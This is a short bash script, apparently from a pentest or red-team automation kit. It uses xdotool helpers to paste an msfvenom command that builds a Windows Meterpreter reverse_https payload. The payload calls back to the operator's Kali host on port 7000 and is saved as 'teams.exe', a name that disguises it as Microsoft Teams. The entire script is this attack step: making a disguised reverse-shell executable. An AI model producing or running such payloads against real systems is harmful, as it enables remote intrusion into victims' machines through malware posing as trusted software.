#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "msfvenom -p windows/x64/meterpreter/reverse_https lhost=${KALI_IP} -f exe -o teams.exe LPORT=7000"
